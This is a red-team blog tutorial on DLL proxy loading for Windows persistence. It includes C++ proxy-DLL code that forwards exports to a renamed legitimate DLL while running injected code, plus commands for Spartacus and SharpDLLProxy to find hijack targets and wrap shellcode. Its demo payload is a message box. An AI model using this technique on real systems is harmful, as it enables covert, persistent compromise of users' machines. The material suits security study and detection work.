# https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/

<!DOCTYPE html><html lang="en" class="wf-loading wf-ubuntu-n4-loading wf-ubuntu-i4-loading wf-ubuntu-n7-loading wf-ubuntu-i7-loading">

<body class="wp-singular post-template-default single single-post postid-33393 single-format-standard wp-embed-responsive wp-theme-premiumthefour customizer-styles-applied jetpack-reblog-enabled custom-colors">
<div id="page" class="site">

	<a class="skip-link screen-reader-text" href="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/#content">Skip to content</a>

	

	<main class="main container clearfix" id="main" role="main">

<section id="content" class="content">

	<article id="post-33393" class="post-33393 post type-post status-publish format-standard hentry category-persistence tag-dll-loading tag-persistence tag-red-team tag-sharpdllproxy">

		<div class="entry-content clearfix">
			
<p class="has-text-align-justify wp-block-paragraph">DLL Proxy Loading is a technique which an arbitrary DLL exports the same functions as the legitimate DLL and forwards the calls to the legitimate DLL in an attempt to not disrupt the execution flow so the binary is executed as normal. The technique falls under the category of <a href="https://pentestlab.blog/2017/03/27/dll-hijacking/">DLL Hijacking</a> and it is typically utilized as a stealthier method to load an arbitrary DLL without breaking the original operation of a process which might be an indicator of compromise for defenders. </p>



<p class="has-text-align-justify wp-block-paragraph">When a process is initiated DLL’s are also loaded and make calls to exported functions as illustrated in the diagram below:</p>



<figure class="wp-block-image size-large"><a href="https://pentestlab.blog/wp-content/uploads/2024/04/dll-loading.jpg"><img data-attachment-id="33394" data-permalink="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/dll-loading/" data-orig-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-loading.jpg" data-orig-size="3544,1128" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dll-loading" data-image-description="" data-image-caption="" data-medium-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-loading.jpg?w=300" data-large-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-loading.jpg?w=760" width="1024" height="325" src="https://pentestlab.blog/wp-content/uploads/2024/04/dll-loading.jpg?w=1024" alt="" class="wp-image-33394"></a><figcaption class="wp-element-caption">DLL Loading</figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">The DLL Proxy Loading technique requires an arbitrary DLL that will be planted in the same directory and with the same name of the legitimate DLL and will proxy the same exports as the original DLL. However, the arbitrary DLL will also load the implant code and therefore code will executed under the context of a trusted process.</p>



<figure class="wp-block-image size-large"><a href="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxy-loading.jpg"><img data-attachment-id="33396" data-permalink="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/dll-proxy-loading/" data-orig-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxy-loading.jpg" data-orig-size="3117,1282" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dll-proxy-loading" data-image-description="" data-image-caption="" data-medium-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxy-loading.jpg?w=300" data-large-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxy-loading.jpg?w=760" width="1024" height="421" src="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxy-loading.jpg?w=1024" alt="" class="wp-image-33396"></a><figcaption class="wp-element-caption">DLL Proxy Loading</figcaption></figure>



<p class="wp-block-paragraph">The following DLL code exports the following functions:</p>



<ol class="wp-block-list">
<li>exportedFunction1</li>



<li>exportedFunction2</li>



<li>exportedFunction3</li>
</ol>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; title: ; notranslate" title="">#include "pch.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) VOID exportedFunction1(int a)
{
    MessageBoxA(NULL, "Pentestlab exportedFunction1", "Pentestlab exportedFunction1", 0);
}

extern "C" __declspec(dllexport) VOID exportedFunction2(int a)
{
    MessageBoxA(NULL, "Pentestlab exportedFunction2", "Pentestlab exportedFunction2", 0);
}

extern "C" __declspec(dllexport) VOID exportedFunction3(int a)
{
    MessageBoxA(NULL, "Pentestlab exportedFunction3", "Pentestlab exportedFunction3", 0);
}
</pre></div>


<figure class="wp-block-image size-large"><a href="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-trusted-dll.png"><img data-attachment-id="33401" data-permalink="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/dll-proxying-loading-trusted-dll/" data-orig-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-trusted-dll.png" data-orig-size="1624,994" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dll-proxying-loading-trusted-dll" data-image-description="" data-image-caption="" data-medium-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-trusted-dll.png?w=300" data-large-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-trusted-dll.png?w=760" loading="lazy" width="1024" height="626" src="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-trusted-dll.png?w=1024" alt="" class="wp-image-33401"></a><figcaption class="wp-element-caption">Trusted DLL</figcaption></figure>



<p class="wp-block-paragraph">Executing the DLL will verify that the code is running as normal.</p>



<pre class="wp-block-code"><code>rundll32 DLL-Proxying.dll,exportedFunction1</code></pre>



<figure class="wp-block-image size-large"><a href="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox.png"><img data-attachment-id="33403" data-permalink="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/dll-proxying-loading-messagebox/" data-orig-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox.png" data-orig-size="1086,506" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dll-proxying-loading-messagebox" data-image-description="" data-image-caption="" data-medium-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox.png?w=300" data-large-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox.png?w=760" loading="lazy" width="1024" height="477" src="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox.png?w=1024" alt="" class="wp-image-33403"></a><figcaption class="wp-element-caption">DLL Proxy Loading – Message Box</figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">From the offensive perspective prior to developing an arbitrary DLL, the exported functions of the legitimate DLL needs to be identified. This is feasible with the DLL export viewer. </p>



<figure class="wp-block-image size-large"><a href="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-viewer.png"><img data-attachment-id="33405" data-permalink="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/dll-proxying-loading-dll-export-viewer/" data-orig-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-viewer.png" data-orig-size="1240,484" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dll-proxying-loading-dll-export-viewer" data-image-description="" data-image-caption="" data-medium-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-viewer.png?w=300" data-large-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-viewer.png?w=760" loading="lazy" width="1024" height="399" src="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-viewer.png?w=1024" alt="" class="wp-image-33405"></a><figcaption class="wp-element-caption">DLL Export Viewer</figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">Alternatively, Visual Studio contains a binary which can used to retrieve the exported functions.</p>



<pre class="wp-block-code"><code>dumpbin.exe /exports C:\temp\DLL-Proxying.dll</code></pre>



<figure class="wp-block-image size-large"><a href="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-dumpbin.png"><img data-attachment-id="33407" data-permalink="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/dll-proxying-loading-dll-export-dumpbin/" data-orig-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-dumpbin.png" data-orig-size="2298,996" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dll-proxying-loading-dll-export-dumpbin" data-image-description="" data-image-caption="" data-medium-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-dumpbin.png?w=300" data-large-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-dumpbin.png?w=760" loading="lazy" width="1024" height="443" src="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-dumpbin.png?w=1024" alt="" class="wp-image-33407"></a><figcaption class="wp-element-caption">DLL Export – Dumpbin</figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">On the proxy DLL a comment directive in the source code will match the exported functions of the legitimate DLL.</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; title: ; notranslate" title="">#include "pch.h"

#pragma comment(linker, "/export:exportedFunction1=trusted1.exportedFunction1")
#pragma comment(linker, "/export:exportedFunction2=trusted1.exportedFunction2")
#pragma comment(linker, "/export:exportedFunction3=trusted1.exportedFunction3")

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        MessageBoxA(NULL, "DLL Proxy Loading", "DLL Proxy Loading", 0);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
</pre></div>


<figure class="wp-block-image size-large"><a href="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-proxy.png"><img data-attachment-id="33410" data-permalink="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/dll-proxying-loading-dll-proxy/" data-orig-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-proxy.png" data-orig-size="1642,904" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dll-proxying-loading-dll-proxy" data-image-description="" data-image-caption="" data-medium-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-proxy.png?w=300" data-large-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-proxy.png?w=760" loading="lazy" width="1024" height="563" src="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-proxy.png?w=1024" alt="" class="wp-image-33410"></a><figcaption class="wp-element-caption">DLL Proxy</figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">Similarly, using the <em>dumpbin</em> binary will verify the exported functions.</p>



<pre class="wp-block-code"><code>dumpbin.exe /exports C:\Users\panag\source\repos\Pentestlab\DLL-Proxying\x64\Release\DLL-Proxying.dll</code></pre>



<figure class="wp-block-image size-large"><a href="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-proxy-dll-dumpbin.png"><img data-attachment-id="33412" data-permalink="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/dll-proxying-loading-dll-export-proxy-dll-dumpbin/" data-orig-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-proxy-dll-dumpbin.png" data-orig-size="2310,928" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dll-proxying-loading-dll-export-proxy-dll-dumpbin" data-image-description="" data-image-caption="" data-medium-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-proxy-dll-dumpbin.png?w=300" data-large-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-proxy-dll-dumpbin.png?w=760" loading="lazy" width="1024" height="411" src="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-dll-export-proxy-dll-dumpbin.png?w=1024" alt="" class="wp-image-33412"></a><figcaption class="wp-element-caption">DLL Export Function – Dumpbin</figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">Execution of the DLL will verify the exported functions are linked to the trusted DLL.</p>



<pre class="wp-block-code"><code>rundll32.exe DLL-Proxying.dll,pentestlab</code></pre>



<figure class="wp-block-image size-large"><a href="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox-1.png"><img data-attachment-id="33414" data-permalink="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/dll-proxying-loading-messagebox-1/" data-orig-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox-1.png" data-orig-size="1086,506" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dll-proxying-loading-messagebox-1" data-image-description="" data-image-caption="" data-medium-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox-1.png?w=300" data-large-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox-1.png?w=760" loading="lazy" width="1024" height="477" src="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-messagebox-1.png?w=1024" alt="" class="wp-image-33414"></a><figcaption class="wp-element-caption">DLL Proxy Loading – MessageBox</figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">Accenture has developed a tool call <em>Spartacus</em> which can be used to identify DLL Proxy opportunities.</p>



<pre class="wp-block-code"><code>Spartacus.exe --mode detect</code></pre>



<figure class="wp-block-image size-large"><a href="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spartacus.png"><img data-attachment-id="33416" data-permalink="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/dll-proxying-loading-spartacus/" data-orig-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spartacus.png" data-orig-size="952,334" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dll-proxying-loading-spartacus" data-image-description="" data-image-caption="" data-medium-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spartacus.png?w=300" data-large-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spartacus.png?w=760" loading="lazy" width="952" height="334" src="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spartacus.png?w=952" alt="" class="wp-image-33416"></a><figcaption class="wp-element-caption">Spartacus – DLL Proxy Detection</figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">In conjunction with Process Monitor it is also feasible to identify DLL Hijacking opportunities and export the output to a CSV file.</p>



<pre class="wp-block-code"><code>Spartacus.exe --mode dll --procmon Procmon64.exe --pml test.plm --csv ./output.csv --exports . --verbose</code></pre>



<figure class="wp-block-image size-large"><a href="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spartacus-dll-hijacking.png"><img data-attachment-id="33418" data-permalink="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/dll-proxying-loading-spartacus-dll-hijacking/" data-orig-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spartacus-dll-hijacking.png" data-orig-size="958,436" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dll-proxying-loading-spartacus-dll-hijacking" data-image-description="" data-image-caption="" data-medium-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spartacus-dll-hijacking.png?w=300" data-large-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spartacus-dll-hijacking.png?w=760" loading="lazy" width="958" height="436" src="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-spartacus-dll-hijacking.png?w=958" alt="" class="wp-image-33418"></a><figcaption class="wp-element-caption">Spartacus – DLL Hijacking</figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph"><a href="https://twitter.com/Flangvik">Melvin Langvik</a> developed a tool called <a href="https://github.com/Flangvik/SharpDllProxy">SharpDLLProxy</a> which retrieves exported functions from a legitimate DLL and generates a proxy DLL template that can be used for DLL Side Loading. </p>



<pre class="wp-block-code"><code>SharpDLLProxy.exe --dll libnettle-8.dll --payload shellcode.bin</code></pre>



<figure class="wp-block-image size-large"><a href="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-sharpdllproxy.png"><img data-attachment-id="33421" data-permalink="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/dll-proxying-loading-sharpdllproxy/" data-orig-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-sharpdllproxy.png" data-orig-size="1572,340" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dll-proxying-loading-sharpdllproxy" data-image-description="" data-image-caption="" data-medium-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-sharpdllproxy.png?w=300" data-large-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-sharpdllproxy.png?w=760" loading="lazy" width="1024" height="221" src="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-sharpdllproxy.png?w=1024" alt="" class="wp-image-33421"></a><figcaption class="wp-element-caption">SharpDLLProxy</figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">The tool will automatically grab the exported functions and will generate the DLL code. It should be noted that the shellcode should be dropped on disk in the form of a binary file (.bin).</p>



<figure class="wp-block-image size-large"><a href="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-sharpdllproxy-dll-proxy.png"><img data-attachment-id="33423" data-permalink="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/dll-proxying-loading-sharpdllproxy-dll-proxy/" data-orig-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-sharpdllproxy-dll-proxy.png" data-orig-size="1662,1178" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dll-proxying-loading-sharpdllproxy-dll-proxy" data-image-description="" data-image-caption="" data-medium-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-sharpdllproxy-dll-proxy.png?w=300" data-large-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-sharpdllproxy-dll-proxy.png?w=760" loading="lazy" width="1024" height="725" src="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-sharpdllproxy-dll-proxy.png?w=1024" alt="" class="wp-image-33423"></a><figcaption class="wp-element-caption">SharpProxyDLL – DLL Proxy Code</figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">Once the associated process is executed the proxy DLL will load the arbitrary code and will forward to the legitimate DLL the exported functions in order to enable the application to run as normal. It should be noted that the legitimate DLL should be renamed and the proxy DLL should contain the same name as the legitimate DLL file.</p>



<figure class="wp-block-image size-large"><a href="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-fzsftp.png"><img data-attachment-id="33425" data-permalink="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/dll-proxying-loading-fzsftp/" data-orig-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-fzsftp.png" data-orig-size="960,308" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dll-proxying-loading-fzsftp" data-image-description="" data-image-caption="" data-medium-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-fzsftp.png?w=300" data-large-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-fzsftp.png?w=760" loading="lazy" width="960" height="308" src="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-fzsftp.png?w=960" alt="" class="wp-image-33425"></a><figcaption class="wp-element-caption">fzsftp</figcaption></figure>



<p class="has-text-align-justify wp-block-paragraph">A command and control session will established every time the associated process is executed on the system. From the perspective of persistence it is essential to choose a common Windows process.</p>



<figure class="wp-block-image size-large"><a href="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-c2.png"><img data-attachment-id="33426" data-permalink="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/dll-proxying-loading-c2/" data-orig-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-c2.png" data-orig-size="1386,352" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dll-proxying-loading-c2" data-image-description="" data-image-caption="" data-medium-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-c2.png?w=300" data-large-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-c2.png?w=760" loading="lazy" width="1024" height="260" src="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-c2.png?w=1024" alt="" class="wp-image-33426"></a><figcaption class="wp-element-caption">DLL Proxy Loading – C2</figcaption></figure>



<figure class="wp-block-image size-large"><a href="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-implant.png"><img data-attachment-id="33428" data-permalink="https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/dll-proxying-loading-implant/" data-orig-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-implant.png" data-orig-size="972,628" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dll-proxying-loading-implant" data-image-description="" data-image-caption="" data-medium-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-implant.png?w=300" data-large-file="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-implant.png?w=760" loading="lazy" width="972" height="628" src="https://pentestlab.blog/wp-content/uploads/2024/04/dll-proxying-loading-implant.png?w=972" alt="" class="wp-image-33428"></a><figcaption class="wp-element-caption">DLL Proxy Loading – Implant</figcaption></figure>



<p class="wp-block-paragraph">The proxy DLL will run in the memory space of the process.  </p>


<div class="wp-block-image">
